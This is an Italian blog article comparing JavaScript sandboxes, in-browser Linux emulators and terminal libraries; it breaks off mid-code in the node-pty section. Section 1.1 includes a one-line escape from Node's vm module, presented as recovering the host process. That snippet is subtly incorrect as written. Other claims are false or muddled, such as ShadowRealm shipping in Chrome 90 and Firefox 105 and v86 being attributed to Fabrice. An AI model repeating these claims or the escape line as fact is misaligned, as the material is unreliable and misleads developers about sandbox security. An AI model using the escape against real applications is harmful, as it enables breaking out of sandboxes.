---
title: Confronto delle soluzioni JavaScript per la simulazione di kernel Linux
description: Un'analisi approfondita delle ricostruzioni di ambienti Linux in JavaScript/TypeScript.
date: 2026-05-28
tags:
  - javascript
  - linux
  - analysis
authors:
  - fox3000foxy
author_pubkey: "MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEoFS9I15CAZojXYc6NMqggEYGct9o9b3JnWdXWOtlzgs2lclmqw8adtWgXUeeBMRHvm5LoajQ+OcImaAyA8jwYA=="
author_sig: "yYgjlZuhbPThuej16x3EmMzVtN0ab5Yz92lXPRiad4kse5slu6xoksKKsAGr7LR8evRGZN/Gh7/+YgY28vUQmA=="
---

# Ogni sandbox JavaScript, emulatore, simulatore e honeypot Linux: a confronto

Bene, allora è un po' che sono fin troppo dentro questa tana del coniglio. Tutto è iniziato perché davo una mano su [typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container): un progetto di Fortune (ci torno tra un attimo): e mi chiedevano sempre "aspetta, qual è la differenza con `v86`?" o "perché non usare `vm2`?": e mi sono reso conto che non potevo dare una risposta chiara senza mappare prima tutto l'ecosistema. Quindi eccoci, suppongo.

Si scopre che ci sono quattro famiglie distinte: le sandbox JS, gli emulatori Linux, i simulatori Linux, e gli honeypot: e non si sovrappongono quasi mai, anche se vengono citate costantemente nella stessa frase. Qualcuno che costruisce un sistema di plugin usa `isolated-vm`. Qualcuno che fa una demo di strumento CLI usa `v86`. Qualcuno che fa threat intelligence SSH usa Cowrie. Risolvono problemi completamente diversi sotto lo stesso vago ombrello di "far girare codice in una scatola."

Ho passato un sacco di tempo a leggere codice sorgente, report CVE, doc di architettura e pagine npm per scrivere questo articolo. Sarà lungo: prenditi un caffè, sul serio. O due.

> Piccolo disclaimer: `typescript-virtual-container` è in evidenza in questo articolo perché è ciò che ha innescato questa ricerca. Ho provato a essere equo con tutto il resto, ma tieni presente questo contesto.

---

## Parte 0: prima, che problema stai davvero risolvendo?

Prima di tuffarci, vale la pena precisare a cosa serve ogni famiglia, perché la terminologia diventa in fretta confusa e la gente mischia tutto di continuo (me compreso, prima di sedermi e mappare tutto per bene).

**Le sandbox JS** isolano codice JavaScript dal processo Node.js ospite. Il modello di minaccia è: codice JS non affidabile che potrebbe chiamare `process.exit()`, leggere file, o lanciare processi figli. La soluzione è una frontiera intorno all'esecuzione V8. Questi strumenti non hanno alcuna nozione di shell Linux, filesystem con permessi, o SSH.

**Gli emulatori Linux** fanno girare un vero kernel Linux non modificato in un emulatore CPU (x86, RISC-V, OR1K) implementato in JavaScript o WebAssembly. Avvii un vero OS. Hai vere chiamate di sistema. Hai compatibilità binaria coi programmi compilati per x86. Il costo in risorse è enorme.

**I simulatori Linux** imitano il *comportamento* di un sistema Linux senza far girare un vero kernel. Implementano un interprete di shell, un filesystem virtuale, e abbastanza semantica Unix da ingannare programmi e umani. Niente kernel, niente Wasm, niente emulazione CPU. Molte meno risorse.

**Gli honeypot** sono pensati per attirare attaccanti e registrare ciò che fanno. Non sono principalmente ambienti di esecuzione: sono strumenti di osservabilità. La fedeltà al comportamento reale di Linux conta solo nella misura in cui impedisce all'attaccante di rilevare la trappola.

Con questa cornice, ecco dove sta ogni progetto di questo articolo:

```
JS sandbox :       vm, vm2, isolated-vm, quickjs-emscripten, Deno Workers, ShadowRealm
Emulatore Linux :  v86, JSLinux/TinyEMU, jor1k, CheerpX, WebContainers, container2wasm
Simulatore Linux : typescript-virtual-container (unico in questo spazio)
Honeypot :         Cowrie, Kippo, Lyrebird, endlessh, sshesame, node-simple-ssh-honeypot
Stack terminal :   xterm.js + node-pty (non un isolatore, ma collegato)
```

---

## Parte 1: le sandbox JavaScript

### 1.1 `vm`: il modulo nativo di Node.js (non ciò che credi)

La risposta più antica a "eseguire JS non affidabile" in Node è il modulo nativo `vm`. Esiste dalla v0.1, quindi un sacco di gente lo usa per prima: e si scotta.

```js
const vm = require("vm");
const sandbox = { answer: 0 };
vm.createContext(sandbox);
vm.runInContext("answer = 6 * 7", sandbox);
console.log(sandbox.answer); // 42
```

Ciò che `vm` fa davvero: crea un nuovo contesto V8 (un nuovo set di costruttori nativi: `Object`, `Array`, `Function`, ecc.) ed esegue codice lì dentro, con un riferimento condiviso a ciò che metti in `sandbox`. Il tuo motore V8 non cambia. Il tuo processo non cambia. La memoria è condivisa.

La ragione per cui `vm` non offre alcuna sicurezza: la catena di prototipi di JavaScript è un DAG che collega tutto a `Object.prototype`. Se metti un oggetto del mondo ospite nella sandbox, l'ospite può risalire la sua catena di prototipi e raggiungere i costruttori ospite. Da `Function`, puoi chiamare `Function("return process")()` e recuperare il vero `process`. Game over. Tipo, subito.

```js
// Funziona perfettamente in vm: recuperi il vero process
vm.runInNewContext(`({}).__proto__.constructor("return process")()`);
```

Voglio dire, la documentazione stessa di Node.js dice: "Il modulo vm non è un meccanismo di sicurezza. Non usarlo per eseguire codice non affidabile." Questo avviso c'è da sempre. La gente lo ignora di continuo. Ho visto app in produzione usare `vm` come sandbox. Per favore, non farlo.

**Verdetto**: un meccanismo di scope, non una sandbox. Usalo quando devi isolare variabili (motori di template, funzionalità tipo `eval` dove controlli il codice). Mai per input non affidabili.

**Memoria**: sovraccarico trascurabile: stesso heap V8 del processo ospite.
**Sicurezza**: nessuna contro un attaccante motivato.

---

### 1.2 `vm2`: il tentativo della community, e la sua lunghissima morte

`vm2` era la risposta della community al problema di evasione di `vm`. L'idea centrale: avvolgere ogni oggetto che attraversa la frontiera della sandbox in un `Proxy` che intercetta gli accessi alle proprietà, blocca la risalita dei prototipi, e filtra i riferimenti pericolosi. Idea intelligente in teoria! In pratica, il risultato si è rivelato molto meno convincente, come vedremo.

```js
const { VM } = require("vm2");
const vm = new VM({ timeout: 1000, sandbox: {} });
vm.run("process.exit(1)"); // lancia VMError, process inaccessibile
```

Per vari anni, ha funzionato piuttosto bene. Ma la superficie di attacco dei `Proxy` JavaScript è enorme. Ogni nuova funzionalità del linguaggio JS: generatori, iteratori asincroni, `Symbol.toPrimitive`, `Error.prepareStackTrace`, gli slot interni di `Promise`: è un potenziale vettore di bypass.

La cronologia dei CVE è... qualcosa. Tipo, guarda qua:

| Data | CVE | Meccanismo |
|------|-----|-----------|
| Ott 2022 | CVE-2022-36067 | Evasione del contesto ospite via `Error.prepareStackTrace` |
| Apr 2023 | CVE-2023-29017 | Fuga di oggetto ospite via errore async non gestito |
| Apr 2023 | CVE-2023-29199 | Bypass della sanificazione delle eccezioni via `handleException()` |
| Apr 2023 | CVE-2023-30547 | `Proxy.getPrototypeOf` → `Function` → RCE |
| Mag 2023 | CVE-2023-32314 | `Proxy` su `Error.name` → `Function` → RCE |
| Giu 2023 | CVE-2023-37466 | Funzione async + stack overflow + `Proxy.getPrototypeOf` |
| Giu 2023 | CVE-2023-37903 | Worker thread + evasione via eval |

Tre CVE critici nello stesso mese (aprile 2023). TRE. IN UN MESE. Dopo CVE-2023-37903, il manutentore ha ufficialmente deprecato la libreria col messaggio: *"La libreria contiene problemi di sicurezza critici e non dovrebbe essere usata in produzione."*

Il manutentore l'ha resuscitata a ottobre 2025 con la versione 3.10.0, sostenendo di aver corretto tutto ciò che era noto all'epoca. Una nuova evasione critica (CVE-2026-22709, CVSS 9.8) è stata divulgata a gennaio 2026, seguita da un lotto di altre undici a maggio 2026. Undici. Lo schema non è cambiato e onestamente non penso cambierà mai.

Il problema fondamentale è architetturale: ed è la lezione che tutto l'ecosistema ha impiegato un po' a imparare. Non puoi costruire una sandbox sicura usando lo stesso linguaggio che isoli, sullo stesso motore, nello stesso processo. La superficie di evasione, è l'intera implementazione di V8: e V8 fa vari milioni di righe di C++ che cambiano di continuo. Ogni nuova funzionalità JS apre potenzialmente una nuova via di attacco.

**Verdetto**: da non usare per app sensibili alla sicurezza. Anche sull'ultima versione, nuovi bypass vengono scoperti ogni pochi mesi. Lo stesso manutentore l'ha riconosciuto apertamente.

---

### 1.3 `isolated-vm`: quello che funziona davvero

`isolated-vm` adotta l'approccio giusto: usare la primitiva di isolamento nativa di V8, l'Isolate. Ogni Isolate V8 ha il suo heap, il suo garbage collector, il suo set di nativi, e zero riferimenti condivisi con gli altri Isolate.

È la stessa frontiera che Chrome usa tra le schede. È una vera barriera di sicurezza, non un trucco di linguaggio costruito su Proxy.

```js
import ivm from "isolated-vm";

// Ogni isolate è il suo heap V8
const isolate = new ivm.Isolate({ memoryLimit: 64 }); // limite in MB
const context = await isolate.createContext();
const jail = context.global;

// Passare dati attraverso la frontiera richiede serializzazione esplicita
await jail.set("sensitiveData", "not this");
await jail.set("log", new ivm.Reference(console.log));

const script = await isolate.compileScript(`
  // Non può raggiungere il process ospite, l'heap ospite o i moduli ospite
  log.applySync(undefined, ["hello from the isolate"]);
`);
await script.run(context);

// Puoi terminare di netto su timeout o limite memoria
isolate.dispose(); // libera tutto l'heap
```

I tipi `Reference` e `ExternalCopy` sono il ponte di comunicazione esplicito. Una `Reference` dà all'isolate un handle chiamabile verso una funzione ospite: l'isolate può chiamarla ma non può ispezionarne la closure o il prototipo. Un `ExternalCopy` serializza un valore (clone strutturato) attraverso la frontiera dell'heap. Questo modello di ponte esplicito non è comodo, ma è ciò che rende reale l'isolamento.

Puoi definire limiti di risorse stretti: memoria (l'isolate è terminato se supera il limite), timeout wall-clock, e timeout CPU. La terminazione è reale: uccide tutto l'Isolate V8, non solo un timeout JS che può essere aggirato con un `while(true)`.

**Limiti**: è solo JS. Non puoi eseguire bash lì dentro. Non c'è nozione di file, permessi, rete o processi. È esattamente lo strumento giusto per JS inviato dall'utente (plugin, formule, hook di script), e lo strumento sbagliato per tutto il resto. L'autrice di `typescript-virtual-container` ha menzionato di averlo considerato all'inizio prima di realizzare che "eseguire comandi shell" e "isolare JavaScript" sono problemi fondamentalmente diversi.

**Memoria**: circa 3-10 MB per isolate vuoto, cresce con l'uso dell'heap.
**Sicurezza**: solida. La frontiera V8 Isolate è la vera primitiva di isolamento.
**npm**: [isolated-vm](https://www.npmjs.com/package/isolated-vm)
**GitHub**: [laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)

---

### 1.4 `quickjs-emscripten`: un motore JS separato compilato in Wasm

Un approccio diverso: invece di isolare dentro V8, far girare un motore JavaScript completamente separato compilato in WebAssembly. L'ospite gira in V8/Node. L'ospitato gira in QuickJS-in-Wasm. La sandbox Wasm fornisce la frontiera di isolamento.

QuickJS è ancora un'opera di Fabrice Bellard (lo stesso tizio dietro QEMU, FFmpeg, JSLinux, TinyEMU: questa persona non è reale, sul serio, come fa una sola persona a fare tutto questo?). È un piccolo motore JS conforme allo standard ES2023 scritto in C, e compilato in Wasm fa solo circa 500 KB.

```js
import { getQuickJS } from "quickjs-emscripten";

const QuickJS = await getQuickJS();
const vm = QuickJS.newContext();

const result = vm.evalCode(`
  // Gira in QuickJS, completamente separato da V8
  (function() { return 6 * 7; })()
`);

if (result.error) {
  console.log("Error:", vm.dump(result.error));
  result.error.dispose();
} else {
  console.log("Result:", vm.dump(result.value)); // 42
  result.value.dispose();
}

vm.dispose();
```

QuickJS è un piccolo motore JavaScript conforme a ES2023 scritto in C. Compilato in Wasm, fa circa 500 KB per la variante sincrona, circa 1 MB per la variante asincrona (Asyncify). La gestione della memoria è manuale: ogni valore che estrai dalla VM deve essere liberato in modo esplicito, il che è un po' noioso ma impedisce sorprese di GC inter-frontiera. Un compromesso divertente!

Il wrapper `@sebastianwessel/quickjs` aggiunge un'API più ergonomica sopra, con un filesystem virtuale opzionale, supporto fetch, e stub di moduli Node.js:

```ts
import variant from "@jitl/quickjs-ng-wasmfile-release-sync";
import { loadQuickJs } from "@sebastianwessel/quickjs";

const { runSandboxed } = await loadQuickJs(variant);

const result = await runSandboxed(
  async ({ evalCode }) => evalCode(`
    import { join } from 'path';
    export default join('src', 'dist');
  `),
  { allowFs: false, allowFetch: false }
);
```

Il modello di sicurezza è diverso da `isolated-vm`: il modello di memoria lineare di Wasm fa sì che l'ospitato non possa accedere direttamente agli oggetti dell'heap V8. La superficie di attacco è l'interfaccia ospite-Wasm (import/export), non tutto il linguaggio JS. È generalmente considerato più robusto degli approcci basati su Proxy.

Il rovescio: QuickJS non ha lo stesso livello di ottimizzazione di V8. Per carichi CPU-bound in JS, è da 5 a 20 volte più lento di V8. Per piccoli pezzi di codice e valutazioni non affidabili, generalmente non ha importanza.

**Memoria**: circa 500 KB modulo Wasm + heap per istanza.
**Sicurezza**: frontiera Wasm, considerata più solida degli approcci basati su Proxy.
**npm**: [quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten), [@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs)
**GitHub**: [justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)

---

### 1.5 Deno: un runtime che mette i permessi al primo posto

Deno adotta una filosofia completamente diversa: invece di fare sandbox dentro Node, costruire un nuovo runtime sicuro di default. Adoro davvero questo approccio: è ciò che Node.js avrebbe dovuto essere fin dall'inizio, onestamente. Ryan Dahl (il creatore originale di Node.js) ha letteralmente creato Deno perché rimpiangeva certe decisioni di progettazione di Node.js, il che è abbastanza folle quando ci pensi.

Ogni capacità sensibile (lettura file, scrittura file, rete, ambiente, sottoprocessi) richiede un flag `--allow-*` esplicito:

```bash
# Questo può leggere solo in /data, niente altro
deno run --allow-read=/data script.ts

# Questo può accedere solo a un singolo dominio
deno run --allow-net=api.example.com script.ts

# Niente flag = nessun permesso
deno run untrusted.ts # non può leggere, scrivere, rete, lanciare
```

Il modello di permessi è implementato a livello Rust/OS: non è un trucco JS. Quando codice Deno chiama `Deno.readFile()`, passa da un'operazione Rust che verifica la tabella dei permessi prima di toccare il filesystem. Non puoi aggirarlo da JS perché la chiamata di sistema non avviene mai se il permesso non è concesso.

Per eseguire codice davvero non affidabile, i Worker Deno (Web Worker) forniscono un secondo isolate nello stesso processo, ognuno col suo set di permessi. Puoi lanciare un worker con zero permessi e comunicare con lui via `postMessage`.

Deno 2 (uscito a ottobre 2024) ha aggiunto compatibilità npm completa e shim di compatibilità Node.js, migliorando molto la sua adozione per casi d'uso lato server.

**Il compromesso**: il modello di sicurezza di Deno è ottimo per codice di cui potresti fidarti parzialmente. Per codice completamente non affidabile che potrebbe essere avversariale, il modello di permessi non aiuta: serve una frontiera Isolate (`isolated-vm`) o un motore diverso (`quickjs-emscripten`), perché Deno usa sempre V8 e attaccanti sofisticati possono trovare bug a livello V8.

---

### 1.6 TC39 ShadowRealm: la risposta standardizzata (un giorno)

L'organismo di standardizzazione JavaScript (TC39) ha una proposta chiamata ShadowRealm che prova a standardizzare ciò che `vm` e `vm2` tentavano di fare, ma con un modello di sicurezza corretto. Uno ShadowRealm crea un contesto di esecuzione JS isolato coi suoi intrinseci, nessun accesso al reame esterno, e un'interfaccia di import/export attentamente controllata.

```js
const realm = new ShadowRealm();
const result = realm.evaluate(`
  // Intrinseci separati, nessun accesso al reame esterno
  typeof globalThis.fetch // "undefined"
  6 * 7 // 42
`);
```

ShadowRealm è disponibile nei browser (Chrome 90+, Firefox 105+) ma non è ancora in Node.js stabile nel 2026. La proposta TC39 Compartments ci costruisce sopra per l'isolamento a livello di moduli. Sono le risposte standardizzate a lungo termine, ma non sono ancora pronte per la produzione lato server Node. È uno di quei cantieri che vedi arrivare da lontano ma... non è proprio ancora lì. Classico TC39.

---

### Riepilogo della famiglia sandbox

| | `vm` | `vm2` | `isolated-vm` | `quickjs-emscripten` | Deno Workers |
|---|---|---|---|---|---|
| **Frontiera di isolamento** | nessuna (scope) | Proxy (rotta) | V8 Isolate | Wasm | V8 Isolate + perm Rust |
| **Limite memoria** | no | no | sì limite stretto | sì heap Wasm | parziale |
| **Timeout CPU** | no | sì (aggirabile) | sì stretto | sì | sì |
| **Sicurezza** | nessuna | rotta | solida | solida | solida |
| **Velocità JS** | V8 nativo | V8 nativo | V8 nativo | circa 10x più lento | V8 nativo |
| **Browser** | no | no | no | sì | no |
| **Compatibilità Node** | nativo | sì | sì | shim parziali | parziale |
| **Stato** | stabile | rischioso (nuovi CVE) | attivo sì | attivo sì | attivo sì |
| **Overhead RAM** | circa 1 MB | circa 5-20 MB | circa 3-10 MB | circa 5-15 MB | circa 10-30 MB |

Il verdetto: se la sicurezza ti importa, ci sono esattamente due vere opzioni: `isolated-vm` (estensione nativa, V8 Isolate, piena velocità JS) e `quickjs-emscripten` (Wasm, compatibile browser, circa 10x più lento per calcolo intenso). Tutto il resto è o "per favore non farlo" (`vm`, `vm2`) o un runtime che risolve un problema completamente diverso (Deno). ShadowRealm potrebbe cambiare le carte un giorno, ma non è ancora il caso.

---

## Parte 2: gli emulatori Linux in JavaScript

È qui che le cose diventano davvero interessanti per me. Sono *veri* emulatori: implementano un set di istruzioni CPU in JavaScript o WebAssembly, avviano una vera immagine di kernel Linux, ed eseguono veri binari utente. L'isolamento viene dal fatto che ospite e ospitante non condividono niente: spazi di memoria diversi, flussi di istruzioni diversi.

Il prezzo da pagare è enorme, ma ciò che ottieni è davvero notevole: vero Linux, che gira davvero, nel tuo browser o nel tuo processo Node. Tipo, è abbastanza folle quando ci pensi, no?

### 2.1 `v86`: emulatore PC x86 in JS + JIT Wasm

`v86` di Fabrice (copy su GitHub) è l'emulatore x86 open-source più capace in JavaScript. È iniziato come interprete JS puro verso il 2013 e si è evoluto in un sistema JIT dove i blocchi base x86 sono tradotti in WebAssembly al volo, migliorando molto le performance.

Ciò che emula:
- **CPU**: x86-32 (IA-32), set di istruzioni circa al livello Pentium 1. Il 64-bit (x86-64) resta escluso: è un limite architetturale hardware, non una funzionalità mancante.
- **FPU**: via `Float64Array` di JavaScript. L'x87 è in precisione estesa 80-bit; i double JS sono in 64-bit. Vuol dire che i risultati in virgola mobile possono differire leggermente da una vera CPU.
- **Memoria**: configurabile, mappa su uno `SharedArrayBuffer` o `ArrayBuffer` nell'heap JS.
- **Hardware**: 8254 PIT (timer), 8259 PIC (controllore di interrupt), controllore tastiera 8042 (PS/2), CMOS RTC, VGA con estensioni SVGA e Bochs VBE, controllore IDE, controllore floppy (8272A), scheda rete NE2000.
- **BIOS**: usa SeaBIOS (BIOS x86 open-source).

Il JIT funziona identificando blocchi base (sequenze di istruzioni x86 senza salti), traducendoli in una funzione WebAssembly, mettendo in cache questa funzione, e chiamandola alle esecuzioni successive dello stesso blocco. I percorsi di codice caldi ottengono performance Wasm native. I percorsi freddi ricadono sull'interprete JS.

```js
import { V86 } from "v86";
import { readFileSync } from "fs";

const emulator = new V86({
  bios:    { buffer: readFileSync("./bios/seabios.bin") },
  vga_bios:{ buffer: readFileSync("./bios/vgabios.bin") },
  hda:     { buffer: readFileSync("./images/alpine.img"), async: false },
  memory_size: 128 * 1024 * 1024, // 128 MB
  autostart: true,
});

// Cattura l'uscita seriale (console kernel Linux)
emulator.add_listener("serial0-output-byte", byte => {
  process.stdout.write(String.fromCharCode(byte));
});

// Invia un input all'ospitato (digitare nella shell)
emulator.serial0_send("ls /\n");
```

**OS supportati**: Alpine Linux (ottimo), Ubuntu 16.04/18.04 (solo i386), Arch Linux 32, ReactOS, FreeDOS, Windows 9x/2000 (con riserve), MS-DOS.

**Tempo di avvio**: 15-40 secondi per Alpine Linux da un'immagine pulita. È inerente all'inizializzazione reale del kernel: non puoi saltarla. Sì, i tuoi utenti guarderanno un kernel Linux avviarsi nel loro browser. È il deal.

**Memoria minima**: 100-256 MB per istanza. La sola cache di codice Wasm JIT può raggiungere decine di MB per un'istanza Linux occupata.

**Uso in Node.js**: pienamente supportato. Il DOM resta superfluo: l'uscita VGA può essere ignorata se ti interessa solo l'uscita seriale.

**Ciò che non puoi fare**: eseguire binari a 64-bit, usare funzionalità moderne del kernel (eBPF, io_uring, ecc.), o far girare più di una manciata di istanze insieme senza raggiungere i limiti di memoria.

**npm**: [v86](https://www.npmjs.com/package/v86): aggiornato di continuo, ultima pubblicazione proprio il giorno in cui scrivo.
**GitHub**: [copy/v86](https://github.com/copy/v86)
**Demo**: [copy.sh/v86](https://copy.sh/v86)

---

### 2.2 JSLinux e TinyEMU: il lavoro di Bellard, in due volte

JSLinux è il proprio emulatore Linux in JavaScript di Fabrice Bellard: il primissimo, pubblicato nel 2011. Continuo a citare Bellard in questo articolo perché continua a riapparire: QuickJS, TinyEMU, JSLinux, QEMU, FFmpeg. Questo tizio è qualcos'altro. Davvero uno dei contributi tecnici individuali più impressionanti della storia del software, senza esagerazione.

Il JSLinux originale era un interprete x86 puro JS. Nel 2016, Bellard ha scritto TinyEMU (un emulatore RISC-V in C), l'ha compilato in JavaScript via Emscripten, ed è diventato la base del JSLinux attuale. Quindi il JSLinux attuale è in realtà codice C che genera JavaScript: non JS scritto a mano per niente.

Le note tecniche sul sito di Bellard valgono la pena di essere lette: il JSLinux attuale fa girare una CPU RISC-V 32 o 64-bit (non x86), emulando una console VirtIO, una rete VirtIO, un dispositivo blocco VirtIO, e un filesystem 9P per la condivisione di file con l'ospite. La demo JS è compilata da C usando Emscripten: non è JS scritto a mano.

TinyEMU stesso supporta:
- RISC-V RV32IMAFDQC e RV64IMAFDQC (32 e 64-bit, con virgola mobile, moltiplicazione, istruzioni compresse)
- x86 via KVM (solo nativo, niente emulazione: quindi la versione JS è solo RISC-V)
- Console VirtIO, rete, blocco, input, filesystem 9P

TinyEMU ha una demo JavaScript fornita via Emscripten. È la base di JSLinux ed è usata anche da `container2wasm` (vedi sezione 2.5).

**Stato JSLinux**: niente package npm, niente API programmabile. È una demo che apri nel browser. L'importanza storica è grande: ha provato il concetto. L'utilità pratica come libreria: nulla.

**TinyEMU**: non su npm, sorgente C disponibile su [bellard.org/tinyemu](https://bellard.org/tinyemu/).

---

### 2.3 jor1k: emulatore OR1K

jor1k è un emulatore OpenRISC 1000 (OR1K) scritto in JavaScript da Sebastian Macke. È interessante storicamente perché jor1k ha introdotto il supporto del filesystem VirtIO 9P, che Bellard ha poi integrato in TinyEMU e JSLinux. L'impollinazione incrociata tra questi progetti è stretta: si prendono in prestito idee a vicenda, il che è onestamente una delle cose più fighe del lavoro di emulazione open-source.

**Stato**: non più mantenuto attivamente, niente package npm. Archiviato a questo punto. Utile da conoscere soprattutto per il contesto storico: tipo se qualcuno cita jor1k in una conversazione, ora sai cos'è :)

---

### 2.4 CheerpX: emulatore x86 commerciale per il browser

CheerpX di Leaning Technologies è l'emulatore Linux x86 commerciale di qualità produzione. Non è open-source, ma è nettamente più capace di v86 per far girare un vero userspace Debian/Ubuntu. Se ti serve un vero VSCode nel browser, è ciò che fa per te.

Differenze chiave con v86:
- Supporta un ISA più ampio (più estensioni x86, migliore compatibilità glibc)
- Filesystem basato su IndexedDB nel browser (persistente tra i ricaricamenti di pagina)
- Supporto pthread via `SharedArrayBuffer` (che richiede gli header COOP/COEP: sì quegli header di sicurezza fastidiosi)
- Pensato per far girare VSCode, Python, Node.js, e altre app reali: non solo immagini OS minime
- Supporto professionale e SLA disponibili (aka puoi prendertela con qualcuno se si rompe)

Il caso d'uso tipico è "far girare una vera app Linux nel browser senza server." Le aziende lo usano per IDE basati su browser, tutorial di coding, e documentazione interattiva.

```js
// API CheerpX (semplificata)
// avvia un Linux e lancia bash
const cx = await CheerpX.Linux.create({
  mounts: [{ type: "ext2", path: "/", dev: CloudDevice.create(...) }],
});
await cx.run("/bin/bash");
```

**Storia con Node.js**: CheerpX è pensato prima per il browser. L'emulatore sottostante potrebbe teoricamente funzionare in Node (è Wasm), ma API e documentazione sono tutte orientate a un uso browser. L'uso lato server non è supportato.

**Memoria**: simile a v86: 200+ MB per una vera istanza Debian.
**Prezzi**: gratis per progetti open-source, licenza commerciale per SaaS in produzione.
**Doc**: [cheerpx.io/docs/overview](https://cheerpx.io/docs/overview)

---

### 2.5 WebContainers (StackBlitz): Node.js in Wasm, non emulazione Linux

I WebContainer sono spesso messi nello stesso mucchio degli emulatori Linux ma sono architetturalmente diversi. Non emulano x86. Non avviano Linux. Fanno girare Node.js compilato in WebAssembly usando WASI. Questa distinzione conta molto e ho passato fin troppo tempo a esserne confuso.

Penso che la confusione venga dal marketing: "far girare Node.js nel tuo browser" sembra emulazione, ma in realtà è Node.js stesso compilato in Wasm, non un'emulazione Linux che fa girare Node.js in una VM. Due architetture completamente diverse.

L'architettura:
1. Node.js è compilato in Wasm (un runtime WASI personalizzato apposta)
2. Un Service Worker intercetta le richieste rete del server Node.js emulato e le instrada verso la scheda del browser
3. Il filesystem vive nella memoria del browser (niente I/O disco)
4. npm è un'implementazione personalizzata ottimizzata per un uso nel browser

```js
import { WebContainer } from "@webcontainer/api";

const webcontainer = await WebContainer.boot();

// Scrittura file
await webcontainer.mount({
  "index.js": { file: { contents: `console.log("hello")` } },
  "package.json": { file: { contents: `{"name":"demo","type":"module"}` } }
});

// Esecuzione comandi Node.js
const proc = await webcontainer.spawn("node", ["index.js"]);
proc.output.pipeTo(new WritableStream({ write: chunk => console.log(chunk) }));
```

Dato che esegue vero Node.js (compilato in Wasm), hai un vero npm, vere API Node.js, e vera risoluzione dei moduli. Non hai uno userspace Linux generalista: non puoi installare pacchetti di sistema con `apt`, eseguire binari compilati arbitrari, o fare molto fuori dall'ecosistema Node.js.

**Prerequisiti browser**: SharedArrayBuffer (richiede gli header COOP/COEP), supporto Service Worker, Wasm moderno.

**Storia con Node.js**: pensato esclusivamente per un uso browser. L'API non funziona fuori da un contesto browser.

**npm**: [@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api)
**Doc**: [webcontainers.io](https://webcontainers.io)

---

### 2.6 container2wasm: container Docker compilati in Wasm

`container2wasm` è uno strumento (non un package npm) di NTT che prende un'immagine di container Docker e la converte in un binario WebAssembly che può girare in qualsiasi ospite Wasm: compreso un browser. Quando l'ho visto la prima volta, non ci ho davvero creduto che funzionasse.

Il meccanismo:
- Per i container x86_64: imbarca Bochs (un emulatore x86, compilato in Wasm) + il filesystem radice del container
- Per i container riscv64: imbarca TinyEMU (ancora Bellard!) + il filesystem radice del container
- Il file `.wasm` risultante avvia l'emulatore, monta il filesystem del container, ed esegue l'entrypoint del container

```bash
# Converti un container Ubuntu 22.04 in Wasm
c2w ubuntu:22.04 out.wasm

# Eseguilo
wasmtime out.wasm uname -a
# Linux 5.15.0 #1 SMP riscv64 GNU/Linux

# O servilo per un uso browser
c2w --to-js ubuntu:22.04 /tmp/htdocs/
```

Il `.wasm` risultante è voluminoso: un'Ubuntu minima fa varie centinaia di MB: ma è completamente autonomo. Puoi inviare un `.wasm` via email a qualcuno e può far girare Ubuntu nel suo browser. Questa frase non dovrebbe avere senso ma eccoci.

**GitHub**: [container2wasm/container2wasm](https://github.com/container2wasm/container2wasm)

---

### Riepilogo della famiglia emulatori

| | `v86` | JSLinux/TinyEMU | jor1k | CheerpX | WebContainers | container2wasm |
|---|---|---|---|---|---|---|
| **Architettura** | x86-32 JIT→Wasm | RISC-V (Wasm) | OR1K (JS) | x86 (proprietario) | Node.js→Wasm/WASI | x86/RISC-V (Wasm) |
| **Vero kernel** | sì | sì | sì | sì | no (Node.js) | sì |
| **64-bit** | no | sì (RISC-V) | no | sì | n/a | sì |
| **Package npm** | sì | no | no | CDN/API | sì | no (strumento CLI) |
| **Uso Node.js** | sì | no | no | no | no (solo browser) | via Wasmtime |
| **Uso browser** | sì | sì | sì | sì | sì | sì |
| **RAM/istanza** | 150-256 MB | circa 64-128 MB | circa 64 MB | 200+ MB | circa 100 MB | circa 200-500 MB |
| **Tempo avvio** | 15-40s | 10-30s | 10-30s | 15-40s | 2-5s | 10-40s |
| **Open source** | sì | sì | sì | no | parziale | sì |
| **Stato** | molto attivo sì | stabile sì | archiviato avviso | commerciale | attivo sì | attivo sì |

Ciò che salta agli occhi in questa tabella: `v86` è l'unico che è un package npm, che gira sia nel browser che in Node, ed è open-source. Ecco perché domina la conversazione sugli "emulatori Linux in JavaScript". Tutto il resto ha un inconveniente: JSLinux non ha API, jor1k è archiviato, CheerpX costa soldi, WebContainers è solo browser e specifico Node, container2wasm richiede un passo di build e una CLI. Se hai solo bisogno di "avviare Linux in JavaScript", `v86` è quasi sempre il buon punto di partenza.

---

## Parte 3: gli stack terminale: xterm.js e node-pty

Due package tornano di continuo quando la gente costruisce esperienze tipo shell. Non sono sandbox o emulatori: sono la tubatura UI e PTY: ma sono così collegati che mi sentirei male a lasciarli fuori. Anche, li ho usati entrambi e sono davvero buoni.

### 3.1 `xterm.js`: il rendering di terminale

xterm.js è un emulatore di terminale per il browser. Mostra uno schermo di terminale (sequenze di escape VT100/xterm) in un elemento `<canvas>`, gestisce gli input tastiera, ed espone un'API per instradare i dati.

Usato da: il terminale integrato di VS Code, Azure Cloud Shell, Proxmox VE, AWS CloudShell, e molti altri.

```js
import { Terminal } from "@xterm/xterm";
import { FitAddon } from "@xterm/addon-fit";

const term = new Terminal({ cursorBlink: true });
const fitAddon = new FitAddon();
term.loadAddon(fitAddon);
term.open(document.getElementById("terminal"));
fitAddon.fit();

// Invia dati al terminale (mostrato come testo)
term.write("$ ");
term.onData(data => {
  // data sono i tasti: invia al tuo backend
  socket.send(data);
});
socket.onmessage(msg => {
  // uscita dal backend: mostrala
  term.write(msg.data);
});
```

xterm.js è solo lo strato di rendering. Non esegue shell. Non interpreta comandi. È un widget di visualizzazione che colleghi al backend di tua scelta. Un sacco di gente pensa che xterm.js "faccia il terminale" ma in realtà è solo lo schermo: devi comunque collegarlo a qualcosa che esegue davvero i comandi.

**npm**: [@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm)
**GitHub**: [xtermjs/xterm.js](https://github.com/xtermjs/xterm.js)

---

### 3.2 `node-pty`: creazione di PTY

`node-pty` crea uno pseudoterminale (PTY) in Node.js e ti dà un handle di lettura/scrittura sopra. Usato con xterm.js, permette di costruire un terminale browser che parla a una vera shell (bash, zsh, fish) in esecuzione sul server.

```js
